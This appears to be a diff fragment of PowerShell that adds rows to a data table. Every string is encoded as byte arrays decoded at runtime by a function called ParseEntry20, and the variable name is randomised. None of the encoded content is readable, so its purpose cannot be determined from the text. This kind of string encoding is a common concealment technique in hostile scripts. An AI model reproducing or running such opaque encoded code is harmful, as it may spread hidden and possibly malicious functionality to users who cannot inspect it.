+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(2,182,238,219,150,198,109,183,225,215,142,213,14,220,200,156,150,217,29,227,207,196,141,246,25,197,191,147) @(84,132,130,174,204,129)),(ParseEntry20 @(232,163,192,201,182,159,166,65,231,194,212,225,139,165,132,89,244,213,223,141) @(189,145,150,176,210,242,202,43)),(ParseEntry20 @(43,25,1,90,29,178,115,246,21,2,80,30,30,162,127,237,19,114,13,87,51,199,38,246,18,56,80,89,28,143,11,252,41,59,40,90,49,196,115,243,21,6,59,94,29,179,115,181,43,22,35,70,38,173,19,187) @(113,65,105,45,127,245,74,134)),(ParseEntry20 @(48,155,209,94,180,56,62,165,207,93,179,79,53,170,182,4,179,17,7,184,217,54,133,20,48,132,251,20,155,17,31,165,225,61,238,22,53,190,214,24,154,22,16,164,206,23,231,11,28,135,194,91) @(81,211,131,110,215,124)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(142,131,174,175,215,114,225,130,161,163,207,97,130,233,136,232,215,109,145,214,143,176,204,66,149,240,255,231) @(216,177,194,218,141,53)),(ParseEntry20 @(117,165,2,97,71,4,197,77,122,196,22,73,122,62,231,85,105,211,29,37) @(32,151,84,24,35,105,169,39)),(ParseEntry20 @(242,74,22,71,0,240,191,216,118,61,9,81,214,209,157,121,28,3,6,205,202,155,92,10,105,11,142,242,203,104,63,0,58,205,199,208,95,40,9,17,212,180,238,104,29,71,95,138) @(168,18,126,48,98,183,134)),(ParseEntry20 @(95,120,243,45,41,226,242,72,124,146,121,121,194,228,11,90,197,112,28,205,199,102,98,201,124,29,222,231,114,93,239,107,40,245,164,84,84,204,72,60,235,247,127,71,236,100,122,209,211,106,125,219,81,61,155,160) @(62,48,161,29,74,166,157)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(8,217,89,213,184,198,178,208,61,146,119,244,184,217,193,209,4,179,124,199,175,235,202,148,19,170,8,157) @(94,235,53,160,226,129,139,227)),(ParseEntry20 @(40,188,207,31,25,227,245,12,39,221,219,55,36,217,215,20,52,202,208,91) @(125,142,153,102)),(ParseEntry20 @(42,180,49,149,0,55,213,41,134,33,73,223,56,181,87,27,142,106,134,24,60,223,61,146,0,30,161,47,128,58,61,155,23,164,90,7,162,29,180,4,20,222,53,151,1,7,209,100) @(112,236,89,226,98)),(ParseEntry20 @(109,176,38,31,111,188,27,89,64,203,16,28,104,129,65,69,104,149,34,68,86,160,38,71,109,175,12,85,64,149,58,89,110,171,77,69,104,149,33,89,65,146,53,88,66,187,68,87,65,188,19,88,64,143,73,18) @(12,248,116,47)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(103,156,128,142,107,233,213,200,82,215,174,175,107,246,166,201,107,246,165,156,124,196,173,140,124,239,209,198) @(49,174,236,251)),(ParseEntry20 @(147,212,35,79,143,176,170,140,47,101,169,140,159,177,59,68,162,153,139,219) @(198,230,117,54,235,221)),(ParseEntry20 @(225,226,166,153,217,253,247,158,223,249,247,221,218,237,251,133,217,137,170,148,247,136,156,132,225,226,132,153,226,195,247,154,216,192,143,148,227,192,143,151,245,214,247,133,226,136,247,154) @(187,186,206,238)),(ParseEntry20 @(3,4,7,252,75,25,238,20,0,102,168,27,57,248,87,38,49,161,126,54,219,58,30,61,173,127,37,251,46,33,27,186,74,14,184,8,40,56,153,94,16,235,35,59,24,181,24,42,204,24,25,44,128,95,96,188) @(98,76,85,204,40,93,129)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(134,172,228,12,9,151,167,187,26,42,146,202,210,33,25,226,196,208,48,52,157,244,201,14,30,145,163,181) @(208,158,136,121,83)),(ParseEntry20 @(62,28,125,174,15,67,71,189,49,125,105,134,50,121,101,165,34,106,102,234) @(107,46,43,215)),(ParseEntry20 @(152,133,58,159,191,132,251,173,54,171,228,240,163,138,103,131,191,240,166,167,30,218,143,169,152,133,24,159,132,186,251,169,49,146,156,242,154,167,19,144,147,242,251,169,49,218,236,187) @(194,221,82,232,221,195)),(ParseEntry20 @(99,120,150,218,162,66,136,116,124,247,142,242,98,158,55,90,160,135,151,109,189,90,98,172,139,150,126,157,78,93,138,156,163,85,222,104,84,169,191,183,75,141,67,71,138,185,241,113,170,70,101,241) @(2,48,196,234,193,6,231)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(221,4,165,128,138,255,178,5,170,140,146,236,209,110,131,199,138,224,194,81,132,159,145,207,198,119,244,200) @(139,54,201,245,208,184)),(ParseEntry20 @(74,58,65,45,247,164,199,117,82,68,22,194,144,252,81,122,94,16,222,244) @(31,8,23,84,147,201,171)),(ParseEntry20 @(177,179,240,76,137,172,161,75,143,168,161,8,138,188,173,80,137,216,252,65,167,217,244,75,136,146,161,79,136,145,217,65,179,145,217,76,165,218,161,78,143,172,202,72,137,173,161,8,177,188,210,80,178,179,193,6) @(235,235,152,59)),(ParseEntry20 @(143,244,88,247,109,223,216,152,240,57,163,61,255,206,219,214,110,170,88,240,237,182,238,98,166,89,227,205,162,209,68,177,108,200,142,132,216,103,146,120,214,221,175,203,71,190,62,236,250,186,253,63) @(238,188,10,199,14,155,183)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(150,106,253,32,192,135,97,162,54,227,130,12,203,13,208,242,2,201,28,253,141,50,208,34,215,129,101,172) @(192,88,145,85,154)),(ParseEntry20 @(183,222,38,122,52,145,21,32,184,191,50,82,9,171,55,56,171,168,61,62) @(226,236,112,3,80,252,121,74)),(ParseEntry20 @(64,252,159,27,110,93,157,135,8,79,35,151,150,59,57,113,198,196,8,118,86,151,147,28,110,116,233,129,14,84,87,211,185,42,52,109,234,179,58,106,126,150,155,25,111,109,153,202) @(26,164,247,108,12)),(ParseEntry20 @(144,68,34,141,70,183,158,122,60,142,65,192,149,117,69,215,65,158,167,103,42,229,119,155,144,91,8,199,105,158,191,122,18,238,28,153,149,97,37,203,104,153,176,123,62,254,21,139,188,72,23,202,105,132,204,49) @(241,12,112,189,37,243)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(92,79,3,157,174,77,68,92,139,141,72,41,53,176,190,56,39,55,161,147,71,23,46,159,185,75,64,82) @(10,125,111,232,244)),(ParseEntry20 @(130,149,141,162,179,202,183,177,141,244,153,138,142,240,149,169,158,227,138,230) @(215,167,219,219)),(ParseEntry20 @(189,254,221,45,56,160,159,197,62,25,222,149,212,13,111,140,196,134,62,32,171,148,231,48,0,191,236,194,3,35,222,210,214,32,27,157,254,207,27,35,169,202,140,49,3,213,159,193) @(231,166,181,90,90)),(ParseEntry20 @(118,54,134,27,6,151,22,97,50,231,79,86,183,0,34,20,176,70,51,184,35,79,44,188,74,50,171,3,91,19,154,93,7,128,64,125,26,185,126,19,158,19,86,9,153,82,85,164,52,109,43,173,103,18,238,68) @(23,126,212,43,101,211,121)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(93,196,177,105,138,153,1,86,104,143,159,72,138,134,114,87,81,174,148,123,157,180,121,18,70,183,224,33) @(11,246,221,28,208,222,56,101)),(ParseEntry20 @(153,57,67,58,131,161,103,127,25,180,142,90,76,20,169,190,66,81,18,218) @(204,11,21,67,231)),(ParseEntry20 @(149,118,128,25,61,55,125,191,74,171,87,108,17,19,250,69,138,93,59,10,8,253,124,130,52,7,58,51,150,87,209,26,60,10,5,254,118,146,47,39,62,117,246,90,139,92,110,8) @(207,46,232,110,95,112,68)),(ParseEntry20 @(224,53,35,156,75,179,238,11,61,159,76,196,229,4,68,198,76,154,215,22,43,244,122,159,224,42,9,214,100,154,207,11,19,255,17,157,229,16,36,218,101,157,192,10,63,255,24,128,204,57,36,153) @(129,125,113,172,40,247)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(121,212,54,183,136,104,223,105,161,171,109,178,0,154,152,29,188,2,139,181,98,140,27,181,159,110,219,103) @(47,230,90,194,210)),(ParseEntry20 @(137,31,44,144,184,64,22,131,134,126,56,184,133,122,52,155,149,105,43,212) @(220,45,122,233)),(ParseEntry20 @(48,215,179,11,88,214,103,26,235,152,69,9,240,9,95,228,185,79,94,235,18,88,221,177,38,98,219,41,51,246,226,8,89,235,31,89,215,161,61,67,222,8,83,251,184,78,104,228,61,91,182,237,30,8,164,50,8,226,157,8,96,192,99,87) @(106,143,219,124,58,145,94)),(ParseEntry20 @(85,52,98,164,151,42,181,23,120,79,84,167,144,23,239,11,80,17,102,255,174,54,136,9,85,43,72,238,184,3,148,23,86,47,9,254,144,3,143,23,121,22,113,227,186,23,234,25,122,6,97,160) @(52,124,48,148,244,110,218,97)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(151,17,28,217,36,243,165,52,162,90,50,248,36,236,214,53,155,123,57,203,51,222,221,112,140,98,77,145) @(193,35,112,172,126,180,156,7)),(ParseEntry20 @(153,153,155,178,168,198,161,161,150,248,143,154,149,252,131,185,133,239,156,246) @(204,171,205,203)),(ParseEntry20 @(174,12,142,97,58,179,109,150,114,27,205,103,135,65,109,159,54,213,114,34,184,103,168,98,1,157,109,146,117,34,181,100,190,108,25,140,25,176,47,43,151,102,160,108,59,131,105,219) @(244,84,230,22,88)),(ParseEntry20 @(60,23,151,76,62,27,170,10,17,108,161,79,57,38,240,22,57,50,147,23,7,7,151,20,60,8,189,6,17,50,139,10,63,12,252,22,57,50,144,10,16,53,132,11,16,38,245,11,19,11,136,6,17,40,248,65) @(93,95,197,124)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(55,87,172,252,167,72,177,82,6,185,203,169,85,208,43,87,154,209,180,104,197,11,36,183,196,188,50,181) @(97,101,192,137,253,15,136)),(ParseEntry20 @(249,183,242,18,200,232,200,1,246,214,230,58,245,210,234,25,229,193,245,86) @(172,133,164,107)),(ParseEntry20 @(112,229,19,170,72,250,66,173,78,254,66,238,75,234,78,182,72,142,31,167,102,142,53,169,115,212,66,169,73,199,58,239,114,199,58,237,103,251,66,168,112,229,41,181,73,250,16,224) @(42,189,123,221)),(ParseEntry20 @(252,47,117,230,157,120,31,235,43,20,178,205,88,9,168,13,67,187,168,87,42,197,53,79,183,169,68,10,209,10,105,160,156,111,73,247,3,74,131,136,113,26,220,16,105,191,206,70,62,217,42,18) @(157,103,39,214,254,60,112)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(1,136,159,241,65,142,110,137,144,253,89,157,13,226,185,182,65,145,30,221,190,238,90,190,26,251,206,185) @(87,186,243,132,27,201)),(ParseEntry20 @(118,68,204,27,133,78,26,240,56,178,97,39,195,53,175,81,63,222,51,220) @(35,118,154,98,225)),(ParseEntry20 @(175,139,47,63,247,178,234,55,44,214,204,224,38,31,160,158,177,116,44,239,185,224,9,60,204,156,234,51,43,239,180,225,31,50,212,199,157,43,113,224,145,225,1,63,244,164,238,122) @(245,211,71,72,149)),(ParseEntry20 @(56,222,77,3,142,197,129,6,21,165,123,0,137,248,219,26,61,251,73,88,183,217,188,24,56,193,103,73,161,236,160,6,59,197,38,89,137,236,187,6,20,252,94,68,163,232,222,64,23,252,120,7) @(89,150,31,51,237,129,238,112)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(0,175,129,183,12,218,212,241,53,228,175,150,12,197,167,240,12,197,164,165,27,247,172,181,27,220,208,255) @(86,157,237,194)),(ParseEntry20 @(56,66,249,235,9,29,195,248,55,35,237,195,52,39,225,224,36,52,254,175) @(109,112,175,146)),(ParseEntry20 @(169,249,160,135,145,230,241,128,151,226,241,195,146,246,253,155,145,146,172,138,191,146,134,132,170,200,241,132,144,219,137,194,171,219,137,195,190,231,241,195,146,146,134,138,151,204,133,205) @(243,161,200,240)),(ParseEntry20 @(252,14,147,239,31,3,205,179,209,117,165,236,24,62,151,175,249,43,151,180,38,31,240,173,252,17,185,165,48,42,236,179,255,21,248,181,24,42,247,179,208,44,128,168,50,46,146,245,211,44,170,167) @(157,70,193,223,124,71,162,197)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(229,173,61,35,233,216,104,101,208,230,19,2,233,199,27,100,233,199,24,49,254,245,16,33,254,222,108,107) @(179,159,81,86)),(ParseEntry20 @(48,186,1,97,236,250,17,15,210,4,90,217,206,42,43,250,30,92,217,170) @(101,136,87,24,136,151,125)),(ParseEntry20 @(150,153,146,132,12,139,248,138,151,45,245,242,155,164,91,167,163,201,151,20,128,242,180,135,55,165,248,142,144,20,141,245,162,137,47,254,143,203,202,27,150,153,168,155,13,139,170,199) @(204,193,250,243,110)),(ParseEntry20 @(126,77,3,60,32,119,214,132,83,54,53,63,39,74,140,152,123,104,7,103,25,107,235,154,126,82,41,118,15,94,247,132,125,86,104,102,39,94,236,132,82,111,16,123,12,112,137,194,82,111,4,123) @(31,5,81,12,67,51,185,242)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(129,25,238,241,141,108,187,183,180,82,192,208,141,115,200,182,141,115,203,227,154,65,195,243,154,106,191,185) @(215,43,130,132)),(ParseEntry20 @(180,176,89,83,165,121,198,139,216,92,104,144,77,253,175,240,70,110,144,41) @(225,130,15,42,193,20,170)),(ParseEntry20 @(123,202,145,141,39,102,171,137,158,6,24,161,152,173,112,74,240,202,158,63,109,161,157,138,39,79,223,143,152,29,108,229,183,188,125,86,220,189,172,35,69,160,149,143,38,86,175,196) @(33,146,249,250,69)),(ParseEntry20 @(92,79,154,51,94,67,167,117,113,52,172,48,89,126,253,105,89,106,158,104,103,95,154,107,92,80,176,121,113,106,134,117,95,84,241,105,89,106,157,117,112,109,137,116,115,68,248,123,112,67,175,116,113,112,245,62) @(61,7,200,3)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(160,199,9,51,172,178,92,117,149,140,39,18,172,173,47,116,172,173,44,33,187,159,36,49,187,180,88,123) @(246,245,101,70)),"",(ParseEntry20 @(56,99,77,214,90,13,173,129,6,120,28,146,89,29,161,154,0,8,65,219,116,120,198,155,56,99,111,214,97,51,173,133,1,65,100,219,96,48,213,136,44,87,28,202,97,120,173,133) @(98,59,37,161,56,74,148,241)),(ParseEntry20 @(90,111,243,78,88,99,206,8,119,20,197,77,95,94,148,20,95,74,247,21,97,127,243,22,90,112,217,4,119,74,239,8,89,116,152,20,95,74,244,8,118,77,224,9,118,94,145,9,118,93,244,7,119,80,156,67) @(59,39,161,126)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(46,192,195,246,227,223,65,193,204,250,251,204,34,170,229,177,227,192,49,149,226,233,248,239,53,179,146,190) @(120,242,175,131,185,152)),"",(ParseEntry20 @(12,80,75,106,73,224,111,120,71,94,18,148,55,95,22,118,73,148,50,114,111,47,121,205,12,80,105,106,114,222,111,124,64,103,106,150,14,114,98,101,101,150,111,124,64,47,26,223) @(86,8,35,29,43,167)),(ParseEntry20 @(239,45,126,20,167,196,170,244,194,86,72,23,160,249,240,232,234,8,122,79,158,216,151,234,239,50,84,94,136,237,139,244,236,54,21,78,160,237,144,244,195,15,109,83,138,211,245,245,195,33,121,17) @(142,101,44,36,196,128,197,130)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(125,98,137,181,85,248,18,99,134,185,77,235,113,8,175,242,85,231,98,55,168,170,78,200,102,17,216,253) @(43,80,229,192,15,191)),"",(ParseEntry20 @(211,165,173,150,214,230,11,249,153,134,216,135,192,101,188,150,167,210,208,219,126,187,145,181,130,205,152,70,234,135,132,155,236,219,115,254,179,244,216,193,197,117,219,142,167,167,141,146,104,222,183,174,184,236,248,15) @(137,253,197,225,180,161,50)),(ParseEntry20 @(142,11,145,77,167,120,28,153,15,240,25,247,88,10,218,41,167,16,146,87,41,183,17,171,28,147,68,9,163,46,141,11,166,111,74,133,39,174,40,178,113,25,174,52,142,4,244,75,62,187,2,246) @(239,67,195,125,196,60,115)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(174,17,68,152,8,191,26,27,142,43,186,119,114,181,24,202,121,112,164,53,181,73,105,154,31,185,30,21) @(248,35,40,237,82)),"",(ParseEntry20 @(247,13,230,86,228,234,108,254,69,197,148,102,239,118,179,198,55,189,69,252,225,102,192,85,223,196,108,250,66,252,236,100,214,91,199,215,26,216,24,241,207,59,207,28) @(173,85,142,33,134)),(ParseEntry20 @(215,89,184,161,83,242,126,156,221,3,210,34,142,232,5,220,117,135,199,91,236,73,184,249,81,225,105,144,221,93,248,103,136,194,9,220,117,135,196,70,251,123,171,230,126,229,33,146,222,100,209,107) @(182,17,234,145,48)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(0,1,99,61,242,248,111,0,108,49,234,235,12,107,69,122,242,231,31,84,66,34,233,200,27,114,50,117) @(86,51,15,72,168,191)),"",(ParseEntry20 @(161,114,133,92,39,126,9,139,78,174,18,118,88,103,206,65,143,24,33,67,124,200,78,157,73,43,116,70,153,114,160,92,11,127,8,140,100,169,125,35,93,2,151,95,142,92,120,4) @(251,42,237,43,69,57,48)),(ParseEntry20 @(150,128,86,35,155,223,152,190,72,32,156,168,147,177,49,121,156,246,161,163,94,75,170,243,150,159,124,105,180,246,185,190,102,64,193,241,147,165,81,101,181,241,182,191,74,80,200,227,186,140,99,100,180,236,202,245) @(247,200,4,19,248,155)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(23,66,236,137,4,6,73,179,159,39,3,36,218,164,20,115,42,216,181,57,12,26,193,139,19,54,77,189) @(65,112,128,252,94)),(ParseEntry20 @(190,214,195,126,143,137,195,126,162,162,215,111,178,214,230,96,166,181,168,58) @(235,228,149,7)),(ParseEntry20 @(227,133,112,9,244,50,128,173,124,61,175,70,216,138,45,21,244,70,221,167,84,76,196,31,227,133,82,9,207,12,128,169,123,4,215,70,225,167,89,7,217,35,128,169,123,76,196,0,218,236,33,72,244,71,140,177,122,19,208,1,227,140,37,67) @(185,221,24,126,150,117)),(ParseEntry20 @(37,211,60,183,39,223,1,241,8,168,10,180,32,226,91,237,32,246,56,236,30,195,60,239,37,204,22,253,8,246,32,241,38,200,87,237,32,246,59,241,9,241,47,240,10,226,94,255,10,225,63,179) @(68,155,110,135)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(241,59,112,19,41,135,110,148,106,101,36,39,154,15,237,59,70,62,58,167,26,205,72,107,43,4,253,106) @(167,9,28,102,115,192,87)),(ParseEntry20 @(13,64,221,124,55,53,36,242,76,21,26,26,210,55,32,63,63,218,56,110) @(88,114,139,5,83)),(ParseEntry20 @(111,14,145,174,56,215,12,38,157,154,99,163,84,1,204,178,56,163,81,44,181,234,20,228,108,63,192,173,57,234,116,100,161,163,27,160,120,16,192,172,0,200,103,62,154,158,49,173) @(53,86,249,217,90,144)),(ParseEntry20 @(232,208,189,180,162,47,182,255,212,220,224,242,15,160,188,242,139,233,151,0,131,209,202,135,229,150,19,163,197,245,161,242,163,56,224,227,252,130,209,183,38,179,200,239,161,237,241,17,151,205,213,218) @(137,152,239,132,193,107,217)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(101,184,198,25,21,199,156,120,80,243,232,56,21,216,239,121,105,210,227,11,2,234,228,60,126,253,151,81) @(51,138,170,108,79,128,165,75)),(ParseEntry20 @(61,192,130,222,8,14,148,204,33,180,150,207,53,81,177,210,37,163,233,154) @(104,242,212,167,108,99,194,181)),(ParseEntry20 @(254,128,130,97,143,210,243,212,188,169,47,222,244,157,145,179,136,37,137,239,134,151,150,158,79,132,172,190,199,162,171,36,181,239,139,150,150,134,47,152,241,248,226,175,139,71,208,168) @(164,216,234,22,237,149,202)),(ParseEntry20 @(65,201,193,136,46,196,211,86,205,160,220,126,228,197,21,235,247,213,27,235,230,120,211,251,217,26,248,198,108,236,221,206,47,211,133,74,229,254,237,59,205,214,97,246,221,209,125,176,242,74,230,167) @(32,129,147,184,77,128,188)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(221,89,6,146,227,8,52,184,8,19,165,237,21,85,193,89,48,191,240,40,64,225,42,29,170,206,114,48) @(139,107,106,231,185,79,13)),(ParseEntry20 @(142,221,97,252,112,14,29,162,166,113,199,124,58,121,168,136,122,212,41,94) @(219,239,55,133,20,99,75)),(ParseEntry20 @(103,121,21,77,117,61,98,73,89,98,68,9,118,45,110,82,95,18,25,64,91,73,21,77,100,72,68,78,116,0,26,13,101,91,60,8,89,75,98,76,103,121,47,82,116,61,48,4) @(61,33,125,58,23,122,91,57)),(ParseEntry20 @(241,211,102,218,109,213,178,230,215,7,142,61,245,164,165,241,80,135,88,250,135,200,201,92,139,89,233,167,220,246,122,156,108,194,228,250,255,89,191,120,220,183,209,236,123,169,62,161,144,250,206,67) @(144,155,52,234,14,145,221)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(2,165,25,45,251,117,99,247,55,238,55,12,251,106,16,246,14,207,60,63,236,88,27,179,25,224,72,101) @(84,151,117,88,161,50,90,196)),(ParseEntry20 @(71,106,102,106,246,144,139,107,17,118,81,250,164,239,97,63,125,66,175,192) @(18,88,48,19,146,253,221)),(ParseEntry20 @(207,248,254,6,21,115,166,67,241,227,175,66,22,99,170,88,247,147,242,11,59,7,251,67,247,206,219,7,21,108,210,68,219,230,174,6,57,112,201,85,241,146,250,4,20,67,162,14) @(149,160,150,113,119,52,159,51)),(ParseEntry20 @(122,10,119,189,165,183,209,109,14,22,233,245,151,199,46,40,65,224,144,152,228,67,16,77,236,145,139,196,87,47,107,251,164,160,135,113,38,72,216,176,190,212,90,53,107,206,246,139,243,95,37,82,193,177,206,131) @(27,66,37,141,198,243,190)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(185,173,245,74,181,216,160,12,140,230,219,107,181,199,211,13,181,199,208,88,162,245,216,72,162,232,164,2) @(239,159,153,63)),(ParseEntry20 @(139,92,79,119,186,3,117,100,132,61,91,95,135,57,87,124,151,42,80,51) @(222,110,25,14)),(ParseEntry20 @(151,159,240,179,114,102,244,183,252,135,41,18,172,144,173,175,114,18,169,189,212,246,66,75,151,159,210,179,73,88,244,179,251,190,81,18,149,189,217,189,95,119,244,179,251,246,66,84,174,246,161,242,114,19,248,171,250,169,86,85,151,150,165,249) @(205,199,152,196,16,33)),(ParseEntry20 @(75,242,160,115,149,13,249,156,102,137,150,112,146,48,163,128,78,215,164,40,172,17,196,130,75,237,138,57,186,36,216,156,72,233,203,41,146,36,195,156,103,208,179,52,184,48,166,146,100,192,163,119) @(42,186,242,67,246,73,150,234)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(4,133,240,125,66,204,173,97,212,229,74,76,209,204,24,133,198,80,81,236,217,56,246,235,69,111,182,169) @(82,183,156,8,24,139,148)),(ParseEntry20 @(76,97,40,67,125,62,18,80,67,0,60,107,64,4,48,72,80,23,55,7) @(25,83,126,58)),(ParseEntry20 @(110,36,252,188,101,76,134,68,24,215,242,52,106,232,1,23,246,248,99,113,243,7,50,224,146,110,50,203,87,6,213,255,95,113,254,6,50,165,242,114,81,231,102,20,247,140,108,54) @(52,124,148,203,7,11,191)),(ParseEntry20 @(22,51,156,90,196,103,86,1,55,253,14,148,71,64,66,17,170,7,241,72,99,47,41,166,11,240,91,67,59,22,128,28,197,112,0,29,31,163,63,209,110,83,54,12,129,41,151,19,116,29,46,185) @(119,123,206,106,167,35,57)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(52,164,29,77,4,132,194,81,245,8,122,10,153,163,40,164,43,96,23,164,182,8,215,6,117,41,254,198) @(98,150,113,56,94,195,251)),(ParseEntry20 @(4,194,122,6,83,60,156,70,37,100,19,161,117,40,121,35,185,104,54,10) @(81,240,44,127,55)),(ParseEntry20 @(18,166,57,148,251,72,123,56,154,18,218,170,110,21,125,149,51,208,253,117,14,123,176,37,186,240,54,54,43,132,20,148,193,117,3,122,179,7,218,227,108,5,113,136,51,171,215,117) @(72,254,81,227,153,15,66)),(ParseEntry20 @(128,250,17,226,130,246,44,164,173,129,39,225,133,203,118,184,133,223,21,185,187,234,17,186,128,229,59,168,173,223,13,164,131,225,122,184,133,223,22,164,172,216,2,170,172,241,115,171,175,200,10,231) @(225,178,67,210)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(172,65,198,243,129,100,28,123,153,10,232,210,129,123,111,122,160,43,227,225,150,73,100,63,183,4,151,187) @(250,115,170,134,219,35,37,72)),"",(ParseEntry20 @(166,27,243,204,206,32,149,168,152,0,162,136,205,48,153,179,158,112,255,193,224,85,254,178,166,27,209,204,245,30,149,172,159,57,218,193,244,29,237,161,178,47,162,208,245,85,149,172) @(252,67,155,187,172,103,172,216)),(ParseEntry20 @(62,185,207,153,60,181,242,223,19,194,249,154,59,136,168,195,59,156,203,194,5,169,207,193,62,166,229,211,19,156,211,223,61,162,164,195,59,156,200,223,18,155,220,222,18,136,173,222,18,139,200,208,19,134,160,148) @(95,241,157,169)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(166,243,132,135,117,183,248,219,145,86,178,149,178,170,101,194,155,176,187,72,189,171,169,133,98,135,252,213) @(240,193,232,242,47)),"",(ParseEntry20 @(234,93,252,15,42,214,43,19,212,70,173,75,41,198,39,8,210,54,240,2,4,162,92,23,233,108,173,12,43,235,83,81,232,127,213,72,5,215,43,22,234,93,198,16,43,214,121,94) @(176,5,148,120,72,145,18,99)),(ParseEntry20 @(26,18,193,176,39,143,20,44,223,179,32,248,31,35,166,234,32,166,45,49,201,216,22,163,26,13,235,250,8,166,53,44,241,211,125,161,31,55,198,246,9,161,58,45,221,233,116,177,53,30,222,181) @(123,90,147,128,68,203)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(43,220,249,252,171,10,145,106,30,151,215,221,171,21,226,107,39,182,220,238,188,39,233,46,48,153,168,180) @(125,238,149,137,241,77,168,89)),"",(ParseEntry20 @(118,153,217,28,168,236,21,177,213,40,243,152,77,150,132,0,168,152,72,187,253,88,132,223,117,168,136,31,169,209,109,245,233,17,139,153,98,240,136,30,144,243,126,169,210,44,161,150) @(44,193,177,107,202,171)),(ParseEntry20 @(135,116,164,23,149,81,64,255,170,15,146,20,146,108,26,227,130,81,160,76,172,77,125,225,135,107,142,93,186,120,97,255,132,111,207,77,146,120,122,255,171,86,183,80,185,86,31,185,171,86,163,80) @(230,60,246,39,246,21,47,137)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(13,171,132,36,248,120,98,170,139,40,224,107,1,193,162,99,248,103,18,254,165,59,227,72,22,238,213,108) @(91,153,232,81,162,63)),"",(ParseEntry20 @(128,10,178,143,184,21,227,136,190,17,227,203,187,5,239,147,184,97,190,130,150,97,190,136,184,60,151,142,184,10,151,143,148,20,226,143,148,22,140,158,190,96,182,141,185,37,231,197) @(218,82,218,248)),(ParseEntry20 @(152,137,229,248,242,189,174,193,132,162,157,242,211,177,164,147,165,218,158,250,163,153,229,160,240,174,185,205,132,252,183,183,213,155,168,147,165,218,157,231,180,171,246,191,223,186,241,207,133,213,158,182,251,191,172,196) @(249,193,183,200,145)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(189,123,98,43,177,14,55,109,136,48,76,10,177,17,68,108,177,17,71,57,166,35,79,41,166,48,76,13,166,46,51,99) @(235,73,14,94)),"",(ParseEntry20 @(176,124,187,50,136,99,234,53,142,103,234,118,139,115,230,46,136,23,183,63,166,22,129,47,176,124,153,50,179,93,234,49,137,94,146,63,178,94,146,60,164,72,234,46,179,22,234,49) @(234,36,211,69)),(ParseEntry20 @(111,19,32,158,128,74,52,4,226,208,106,104,22,215,214,100,63,31,248,136,84,3,32,198,130,89,35,8,226,142,64,45,16,253,218,100,63,31,251,149,67,49,51,217,174,119,107,5,227,153,91,34,62,217,222,51) @(14,91,114,174,227)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(223,146,171,83,85,78,148,219,234,217,133,114,85,81,231,218,211,248,142,65,66,99,236,159,196,217,133,117,66,110,144,213) @(137,160,199,38,15,9,173,232)),"",(ParseEntry20 @(35,247,87,187,103,81,172,9,203,124,245,54,119,194,76,196,93,255,97,108,217,74,225,75,149,108,47,225,26,213,126,252,93,108,212,1,226,105,245,118,117,167,63,213,92,187,56,43) @(121,175,63,204,5,22,149)),(ParseEntry20 @(75,133,17,240,158,22,118,85,102,254,39,243,153,43,44,73,78,160,21,171,167,10,75,75,75,154,59,186,177,63,87,85,72,158,122,170,153,63,76,85,103,167,2,183,176,43,41,84,100,153,14,186,177,37,36,30) @(42,205,67,192,253,82,25,35)))  
+    $Null = $ChwBZi.Rows.Add((ParseEntry20 @(165,114,196,181,29,180,121,155,163,62,177,20,242,152,13,193,26,240,137,32,190,42,233,183,10,138,2,251,141,32,206,125) @(243,64,168,192,71)),"",(ParseEntry20 @(192,148,13,15,133,176,59,234,168,38,65,212,150,85,175,167,7,75,131,141,78,169,130,17,33,142,206,118,249,182,36,74,191,141,67,170,129,35,65,146,173,90,200,164,6,63,140,202) @(154,204,101,120,231,247,2)),(ParseEntry20 @(51,165,200,83,103,95,127,36,161,169,7,55,127,105,103,135,254,14,82,112,74,10,191,242,2,83,99,106,30,128,212,21,102,72,41,56,137,247,54,114,86,122,19,154,212,10,52,97,94,22,160,175) @(82,237,154,99,4,27,16)))  
